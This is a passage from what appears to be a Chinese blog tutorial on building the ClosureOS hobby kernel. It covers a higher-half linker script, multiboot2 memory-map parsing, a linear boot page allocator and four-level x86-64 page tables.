align="center">256MB</td><td align="center">kernel .bss segment</td></tr><tr><td align="center">0xFFFFFF8050000000</td><td align="center">0xFFFFFFFFFFFFFFFF</td><td align="center">511GB</td><td align="center">unused hole</td></tr></tbody></table><p>相应地，我们需要略微调整一下原有的链接脚本中的内核部分，在第一章时笔者仅是简单地将其放置在高内存区域，现在我们根据如上所示内存布局进行调整，这里注意计算各个段的物理位置：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">OUTPUT_FORMAT(<span class="hljs-string">&quot;elf64-x86-64&quot;</span>)<br><span class="hljs-title">OUTPUT_ARCH(i386:</span>x86-<span class="hljs-number">64</span>)<br>ENTRY(_start)<br><br>SECTIONS<br>&#123;<br><span class="hljs-comment">/* ... */</span><br><br>__boot_end = .<span class="hljs-comment">;</span><br><br><span class="hljs-comment">/* now we come to the REAL kernel */</span><br><br>KERN_ELF_BASE = <span class="hljs-number">0</span>xFFFFFF8000000000<span class="hljs-comment">;</span><br>. = KERN_ELF_BASE<span class="hljs-comment">;</span><br>__kernel_start = .<span class="hljs-comment">;</span><br><br><span class="hljs-comment">/* we use AT() there to make it loaded on phys correctly */</span><br><br>KERN_TEXT_BASE = KERN_ELF_BASE<span class="hljs-comment">;</span><br>. = KERN_TEXT_BASE<span class="hljs-comment">;</span><br>__kernel_text_base = .<span class="hljs-comment">;</span><br><br><span class="hljs-title">.text ALIGN(4096) :</span> AT (__kernel_text_base - __kernel_start + __boot_end)<br>&#123;<br>*(.text)<br>*(.text.*)<br>&#125;<br><br>. = ALIGN(<span class="hljs-number">4096</span>)<span class="hljs-comment">;</span><br><br>__kernel_text_end = .<span class="hljs-comment">;</span><br>__kernel_text_sz = __kernel_text_end - __kernel_text_base<span class="hljs-comment">;</span><br><br>KERN_DAT<span class="hljs-built_in">A_BASE</span> = <span class="hljs-number">0</span>xFFFFFF8010000000<span class="hljs-comment">;</span><br>. = KERN_DAT<span class="hljs-built_in">A_BASE</span><span class="hljs-comment">;</span><br>__kernel_dat<span class="hljs-built_in">a_base</span> = .<span class="hljs-comment">;</span><br><br><span class="hljs-title">.data ALIGN(4096) :</span> AT (__kernel_text_sz + __boot_end)<br>&#123;<br>*(.data)<br>__init_array = .<span class="hljs-comment">;</span><br>*(.init_array)<br>__fini_array = .<span class="hljs-comment">;</span><br>*(.fini_array)<br>&#125;<br><br>. = ALIGN(<span class="hljs-number">4096</span>)<span class="hljs-comment">;</span><br><br>__kernel_dat<span class="hljs-built_in">a_end</span> = .<span class="hljs-comment">;</span><br>__kernel_dat<span class="hljs-built_in">a_sz</span> = __kernel_dat<span class="hljs-built_in">a_end</span> - __kernel_dat<span class="hljs-built_in">a_base</span><span class="hljs-comment">;</span><br><br>KERN_RODAT<span class="hljs-built_in">A_BASE</span> = <span class="hljs-number">0</span>xFFFFFF8020000000<span class="hljs-comment">;</span><br>. = KERN_RODAT<span class="hljs-built_in">A_BASE</span><span class="hljs-comment">;</span><br>__kernel_rodat<span class="hljs-built_in">a_base</span> = .<span class="hljs-comment">;</span><br><br><span class="hljs-title">.rodata ALIGN(4096) :</span> AT (__kernel_dat<span class="hljs-built_in">a_sz</span> + __kernel_text_sz + __boot_end)<br>&#123;<br>*(.rodata)<br>&#125;<br><br>. = ALIGN(<span class="hljs-number">4096</span>)<span class="hljs-comment">;</span><br><br>__kernel_rodat<span class="hljs-built_in">a_end</span> = .<span class="hljs-comment">;</span><br>__kernel_rodat<span class="hljs-built_in">a_sz</span> = __kernel_rodat<span class="hljs-built_in">a_end</span> - __kernel_rodat<span class="hljs-built_in">a_base</span><span class="hljs-comment">;</span><br><br>KERN_BSS_BASE = <span class="hljs-number">0</span>xFFFFFF8030000000<span class="hljs-comment">;</span><br>. = KERN_BSS_BASE<span class="hljs-comment">;</span><br>__kernel_bss_base = .<span class="hljs-comment">;</span><br><br><span class="hljs-title">.bss ALIGN(4096) :</span> AT (__kernel_rodat<span class="hljs-built_in">a_sz</span> + __kernel_dat<span class="hljs-built_in">a_sz</span> + __kernel_text_sz + __boot_end)<br>&#123;<br>*(COMMON)<br>*(.bss)<br>&#125;<br><br>. = ALIGN(<span class="hljs-number">4096</span>)<span class="hljs-comment">;</span><br><br>__kernel_bss_end = .<span class="hljs-comment">;</span><br>__kernel_bss_sz = __kernel_bss_end - __kernel_bss_base<span class="hljs-comment">;</span><br><br>. = ALIGN(<span class="hljs-number">4096</span>)<span class="hljs-comment">;</span><br><br>__kernel_end = .<span class="hljs-comment">;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="0x01-内存探测，临时内存分配器，页表重建"><a href="#0x01-内存探测，临时内存分配器，页表重建" class="headerlink" title="0x01. 内存探测，临时内存分配器，页表重建"></a>0x01. 内存探测，临时内存分配器，页表重建</h1><h2 id="内存容量获取与线性内存分配器"><a href="#内存容量获取与线性内存分配器" class="headerlink" title="内存容量获取与线性内存分配器"></a>内存容量获取与线性内存分配器</h2><p>在初始化内存管理器之前，首先我们需要知道当前究竟有多少内存，熟悉 BIOS 下 OS 开发的同学肯定对BIOS <code>0x15</code> 中断的 <code>0xE820</code> 、<code>0xE801</code> 、<code>0x88</code> 这三板斧再熟悉不过了，然而在 UEFI 启动中我们是无法使用 legacy BIOS 的中断进行内存探测的</p><p>万幸的是在 UEFI 中同样有类似的接口供我们获取内存容量——<a href="https://uefi.org/htmlspecs/ACPI_Spec_6_4_html/15_System_Address_Map_Interfaces/uefi-getmemorymap-boot-services-function.html">UEFI GetMemoryMap()</a>，不过在我们的系统当中，通过该接口获取内存容量的任务是由 EFI 程序 Grub 完成的—— <strong>得益于 multiboot 规范的存在，我们可以直接从 multiboot header 获取到内存容量</strong> </p><p><a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Boot-information-format">multiboot2 规范</a>中 Memory Map 段的 tag 格式如下，其中 <code>size</code> 为 tag header 加上 所有 entry 的大小， <code>entry_size</code> 为单条 entry 的大小：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u32     |<span class="hljs-string"> type = 6          </span>|<br>u32     |<span class="hljs-string"> size              </span>|<br>u32     |<span class="hljs-string"> entry_size        </span>|<br>u32     |<span class="hljs-string"> entry_version     </span>|<br>varies  |<span class="hljs-string"> entries           </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure><p>每个 entry 的格式如下：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u64     |<span class="hljs-string"> base_addr         </span>|<br>u64     |<span class="hljs-string"> length            </span>|<br>u32     |<span class="hljs-string"> type              </span>|<br>u32     |<span class="hljs-string"> reserved          </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure><p>我们简单写一个示例函数（非正式代码）进行测试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">boot_mm_test</span><span class="hljs-params">(<span class="hljs-type">multiboot_uint8_t</span> *mbi)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">multiboot_tag</span> *<span class="hljs-title">tag</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">multiboot_tag_mmap</span> *<span class="hljs-title">mmap_tag</span> =</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> mmap_entry_nr;<br><br>    <span class="hljs-keyword">for</span> (tag = (<span class="hljs-keyword">struct</span> multiboot_tag *) (mbi + <span class="hljs-number">8</span>);<br>         tag-&gt;type != MULTIBOOT_TAG_TYPE_END;<br>         tag = (<span class="hljs-keyword">struct</span> multiboot_tag *)<br>                 ((<span class="hljs-type">multiboot_uint8_t</span> *) tag + ((tag-&gt;size + <span class="hljs-number">7</span>) &amp; ~<span class="hljs-number">7</span>))) &#123;<br>        <span class="hljs-keyword">if</span> (tag-&gt;type == MULTIBOOT_TAG_TYPE_MMAP) &#123;<br>            mmap_tag = (<span class="hljs-keyword">struct</span> multiboot_tag_mmap*) tag;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!mmap_tag) &#123;<br>        boot_puts(<span class="hljs-string">&quot;[x] Unable to find mmap tag in multiboot info! Halting...&quot;</span>);<br>        <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot; hlt; &quot;</span>)</span>;<br>    &#125;<br><br>    mmap_entry_nr = (mmap_tag-&gt;size - <span class="hljs-keyword">sizeof</span>(*mmap_tag)) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> multiboot_mmap_entry);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; mmap_entry_nr; i++) &#123;<br>        boot_printstr(<span class="hljs-string">&quot;[*] Memory region &quot;</span>);<br>        boot_printnum(i);<br>        boot_printstr(<span class="hljs-string">&quot;, addr: 0x&quot;</span>);<br>        boot_printhex(mmap_tag-&gt;entries[i].addr);<br>        boot_printstr(<span class="hljs-string">&quot;, size: 0x&quot;</span>);<br>        boot_printhex(mmap_tag-&gt;entries[i].len);<br>        boot_printstr(<span class="hljs-string">&quot;, type: &quot;</span>);<br>        boot_printnum(mmap_tag-&gt;entries[i].type);<br>        boot_putchar(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到我们有不少内存段，但其中绝大部分都是不可作为内存使用的保留段（<code>type ==2</code>），我们能用来作为内存使用的只有 <code>type==1</code> 的段：</p><blockquote><p>这些保留段包括 MMIO 区域等</p></blockquote><p><img src="https://s2.loli.net/2024/06/16/PogROmLe2KjQwi3.png"></p><p>现在让我们正式开始编写与内存管理相关的代码，类似于内核需要分步装载（boot loader 到 kernel），我们的内存管理器同样采用 <strong>分步走</strong> 的设计思路：</p><ul><li>先创建一个最基本的内存管理器，由其分配正式的内存管理器所需的内存，再启用正式的内存管理器</li></ul><p>这个内存分配器的作用 <strong>仅</strong> 是为我们接下来创建正式的内存管理器进行内存分配，因此我们 <strong>不需要考虑释放内存的情况，直接线性地分配可用内存空间即可</strong> ，为了简化此阶段的内存分配模型，这里我们限定每次分配的内存大小为单张内存页：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">multiboot_tag_mmap</span> *<span class="hljs-title">mmap_tag</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> mmap_entry_nr;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">multiboot_mmap_entry</span> *<span class="hljs-title">curr_entry</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">int</span> curr_entry_idx = <span class="hljs-number">-1</span>;<br><span class="hljs-type">phys_addr_t</span> curr_avail, curr_end;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Linear allocator without releasing, alloc a page each time.</span><br><span class="hljs-comment"> * Note that the result could be physical 0, NULL should not be use as failure,</span><br><span class="hljs-comment"> * but a -EMOMEM or some other error number should be returned.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">boot_mm_page_alloc_internal</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *res;<br><br>    <span class="hljs-comment">/* initialization */</span><br>    <span class="hljs-keyword">if</span> (!curr_entry) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (curr_entry_idx + <span class="hljs-number">1</span>); i &lt; mmap_entry_nr; i++) &#123;<br>            <span class="hljs-keyword">if</span> (mmap_tag-&gt;entries[i].type == MULTIBOOT_MEMORY_AVAILABLE) &#123;<br>                <span class="hljs-type">phys_addr_t</span> base = mmap_tag-&gt;entries[i].addr;<br>                <span class="hljs-type">phys_addr_t</span> end = base + mmap_tag-&gt;entries[i].len;<br><br>                <span class="hljs-keyword">if</span> (base &gt; end) &#123;<br>                    boot_puts(<span class="hljs-string">&quot;[x] FATAL ERROR: &quot;</span><br>                              <span class="hljs-string">&quot;integeter overflow at parsing multiboot tags&quot;</span>);<br>                    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot; hlt; &quot;</span>)</span>;<br>                &#125;<br><br>                <span class="hljs-comment">/**</span><br><span class="hljs-comment">                 * we&#x27;d like to give up the first and last partial page,</span><br><span class="hljs-comment">                 * as it&#x27;s not enough for use to use</span><br><span class="hljs-comment">                */</span><br>                base = PAGE_ALIGN(base);<br>                end &amp;= PAGE_MASK;<br>                <br>                <span class="hljs-comment">/* available region may be less than 1 page, ignore */</span><br>                <span class="hljs-keyword">if</span> ((end &lt; base) || ((end - base) &lt; PAGE_SIZE)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br><br>                curr_avail = base;<br>                curr_end = end;<br>                curr_entry = &amp;mmap_tag-&gt;entries[i];<br>                curr_entry_idx = i;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!curr_entry) &#123;<br>        boot_puts(<span class="hljs-string">&quot;[x] FATAL ERROR: NO MEMORY AVAILABLE!&quot;</span>);<br>        <span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);<br>    &#125;<br><br>    res = (<span class="hljs-type">void</span>*) curr_avail;<br>    curr_avail += PAGE_SIZE;<br><br>    <span class="hljs-keyword">if</span> (curr_avail == curr_end) &#123;<br>        curr_entry = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的一点是， <strong>我们的内核本体便位于可用内存区域</strong> ，因此在进行内存分配时我们应当跳过这些区域，得益于 Multiboot 规范的存在， boot loader 会向我们提供一个如下格式的 tag 来存放 ELF 各节的信息：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u32     |<span class="hljs-string"> type = 9          </span>|<br>u32     |<span class="hljs-string"> size              </span>|<br>u16     |<span class="hljs-string"> num               </span>|<br>u16     |<span class="hljs-string"> entsize           </span>|<br>u16     |<span class="hljs-string"> shndx             </span>|<br>u16     |<span class="hljs-string"> reserved          </span>|<br>varies  |<span class="hljs-string"> section headers   </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure><p>ELF 格式是 *nix 系统中常用的可执行程序的格式，也是我们的 ClosureOS kernel 文件的格式，简单理解可以认为其由一个 ELF header 存储总的信息，由一个 header table 存储不同 section 的信息，简而言之一个 ELF 文件应当长这个样子：</p><p><img src="https://i.loli.net/2021/06/03/boZ8nCURBOXfdQH.png" alt="ELF 格式提供了两种基本视图：链接视图与执行视图，区别大概就是链接后会把相同的段整合在一起"></p><p>更加详细的细节笔者就不赘叙了，感兴趣的可以自行参考 <a href="https://refspecs.linuxfoundation.org/elf/elf.pdf">Linux Foundation - Executable and Linking Format (ELF) Specification</a> ，这里我们简单介绍一下 section header 的格式，multiboot2 elf tag 提供给我们的 section headers 和 ELF 中的 section header table 是一样的，都是一个如下所示结构体的数组，不同的是 <code>sh_offset</code> 段被 GRUB 填上其相对于 ELF 加载起始地址的偏移（在上一篇文章中，我们在链接脚本中将这个起始地址设为 <code>1M</code> ）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elf64_shdr</span> &#123;</span><br>    elf64_word  sh_name;<br>    elf64_word  sh_type;<br>    elf64_xword sh_flags;<br>    elf64_addr  sh_addr;<br>    elf64_off   sh_offset;<br>    elf64_xword sh_size;<br>    elf64_word  sh_link;<br>    elf64_word  sh_info;<br>    elf64_xword sh_addr_align;<br>    elf64_xword sh_ent_size;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>至于为什么是 section header 而不是 program header，总之 multiboot2 specification 就是这么定义的…</p></blockquote><p>这里我们简单写一个 wrapper 在每次进行内存分配之后将地址与 ELF tag 中各 section 的地址范围进行对比，若刚好位于 ELF 范围则重新进行内存分配，这里我们仅考虑 <code>shdr-&gt;sh_type == SHT_PROGBITS</code> 的情况，因为 <code>.text</code> 等段都是这个类型，其他的一些例如 <code>.symtab</code> 等段对于我们程序运行而言其实并不重要；此外我们仅考虑 <code>shdr-&gt;sh_flags</code> 包含 <code>SHF_ALLOC</code> 的情况，只有存在该标志位才表示这个段在运行时需要内存</p><blockquote><p>至于 <code>.bss</code> 段，我们所获得的类型为 <code>shdr-&gt;sh_type == SHT_NOBITS</code> ，因为这个段的数据全为 0，所以在这里我们可以暂时忽略，等到后续重建高端内核内存映射时再分配这个段的空间</p></blockquote><p>此外，我们还需要避免覆写掉 multiboot tags 所在的区域以及 frame buffer 所在区域：</p><blockquote><p>实际上，frame buffer 的内存区域通常并不直接来自 RAM，而是来自显卡，不过保险起见这里多加一份检查</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">multiboot_tag_elf_sections</span> *<span class="hljs-title">elf_info_tag</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">phys_addr_t</span> multiboot_tag_start, multiboot_tag_end;<br><br><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">addr_is_in_used_range</span><span class="hljs-params">(<span class="hljs-type">phys_addr_t</span> addr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elf64_shdr</span> *<span class="hljs-title">shdr</span>;</span><br>    <span class="hljs-type">void</span> *shdr_end;<br>    <span class="hljs-type">phys_addr_t</span> seg_start, seg_end;<br><br>    <span class="hljs-comment">/* in ELF range */</span><br>    shdr_end = (<span class="hljs-type">void</span>*) ((<span class="hljs-type">phys_addr_t</span>) &amp;elf_info_tag-&gt;sections<br>               + elf_info_tag-&gt;num * <span class="hljs-keyword">sizeof</span>(*shdr));<br><br>    <span class="hljs-keyword">for</span> (shdr = (<span class="hljs-type">void</span>*) &amp;elf_info_tag-&gt;sections;<br>         (<span class="hljs-type">void</span>*) shdr &lt; shdr_end;<br>         shdr = (<span class="hljs-type">void</span>*) ((<span class="hljs-type">phys_addr_t</span>) shdr + <span class="hljs-keyword">sizeof</span>(*shdr))) &#123;<br><br>        <span class="hljs-keyword">if</span> ((shdr-&gt;sh_type != SHT_PROGBITS)<br>            || !(shdr-&gt;sh_flags &amp; SHF_ALLOC)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        seg_start = <span class="hljs-number">0x100000</span> + shdr-&gt;sh_offset;<br>        seg_end = PAGE_ALIGN(seg_start + shdr-&gt;sh_size);<br><br>        <span class="hljs-keyword">if</span> (addr &gt;= seg_start &amp;&amp; addr &lt; seg_end) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* in frame buffer */</span><br>    <span class="hljs-keyword">if</span> (boot_tty_has_fb()) &#123;<br>        <span class="hljs-keyword">if</span> ((addr &gt;= (<span class="hljs-type">phys_addr_t</span>) boot_fb_base)<br>            &amp;&amp; (addr &lt;= (<span class="hljs-type">phys_addr_t</span>) boot_fb_end)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* in multiboot tags */</span><br>    <span class="hljs-keyword">if</span> ((addr &gt;= multiboot_tag_start) &amp;&amp; (addr &lt;= multiboot_tag_end)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="页表重建立"><a href="#页表重建立" class="headerlink" title="页表重建立"></a>页表重建立</h2><p>有了临时的动态内存分配器，现在我们可以开始 <strong>建立一个常规的四级页表，并将内核本体对应的物理内存映射到高端内存空间</strong> ，完成这一部分的初始化工作之后我们的后续工作都将在高半部内核完成</p><p>首先是页表映射的建立，页表主要用于将由页表所定义的虚拟地址空间映射到物理地址空间上，在 CPU 进行内存访问时内存管理单元（Memory Management Unit）会根据页表将虚拟地址翻译（translate）成物理地址，在纯 64 位模式下虚拟地址的最大长度为 8 字节，在兼容模式下虚拟地址仅能用前 4 字节，且需要额外经历基于分段的翻译， <strong>我们的 ClosureOS 为纯 64 位系统，暂时不考虑 32 位的情况</strong> ：</p><blockquote><p>注： <em>本章</em> 暂时不考虑 <em>翻译后备缓冲区</em> （Translation Lookaside Buffer），感兴趣的同学可以先自行了解</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129170947.png" alt="amd64 下的页表翻译过程"></p><p>64 位下最常用的是 4 级页表结构，页顶级表的地址被存放在 CR3 寄存器中，通常情况下一张内存页被设定为 4KB，单条页表项的长度为 8 字节：</p><ul><li>对于虚拟地址而言，前 12 位被用来表示内存页内的偏移；对于页表项而言，前 12 位用于存放页权限等信息</li><li>剩下的 36 位每 9 位用来表示在页表不同级别的偏移，开启 5 级分页后额外多用 9 位表示第 5 级的偏移，否则作为保留位</li><li>剩下 7 位用作扩展</li></ul><p><img src="https://s2.loli.net/2024/06/20/SvC9YmyWuphJosO.png" alt="4 级页表结构，来自 AMD64 Architecture Programmer&#39;s Manual Volume 2"></p><p>纯 64 位模式下，4K 页的页表项结构如下：</p><p><img src="https://s2.loli.net/2024/06/20/QoBCNTfJPAzwvxr.png"></p><p>前 12 位的各位说明如下：</p><ul><li><strong>AVL</strong>：available，该页是否可用，可忽略</li><li><strong>G</strong>：是否为<strong>全局页</strong>，全局页会被保存在 TLB 中方便调用；1为是</li><li><strong>PAT</strong>：页属性表位，用以在分级页表中设定页的属性，这里暂且先置0</li><li><strong>D</strong>：Dirty，当一张内存页被写入时，CPU会将该页<strong>标脏</strong>，仅针对页表项有效</li><li><strong>A</strong>：Accessed，该页每次被访问时该位都会被置1，定期清零，置1次数用以表示使用频率</li><li><strong>PCD</strong>：Page-level Cache Disable，0 为启用高速缓存，1 为禁止</li><li><strong>PWT</strong>：Page-level Write-Through，页级通写位，与高速缓存有关，这里暂且置 0</li><li><strong>US</strong>：User&#x2F;Supervisor，权限位，1 时 ring0~ring3 均可访问该页，0时仅 ring0~ring2 可访问（一般来说操作系统只需要用到 ring0 与 ring3）</li><li><strong>RW</strong>：即 Read&#x2F;Write，该位为 1 时该页可读写，否则只可读不可写</li><li><strong>P</strong>：Present，即该页是否存在，0 表示该页不存在于物理页中，此时对该页的访问会引发缺页异常</li></ul><p>我们的 ClosureOS 使用的是常规的 4 级页表与 4KB 页大小，因为这更适合我们对不同的内存区域进行更加细粒度的映射管理，对于页表的映射建立操作，我们只需要直接分配各级页表项的空间后写入即可，这里需要注意的是 <strong>高级页目录表项权限会限制低级页表项的权限，因此对于存在映射的虚拟内存区域，除了最后一级页表项以外的页目录表项我们都应当给予可写的权限</strong> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 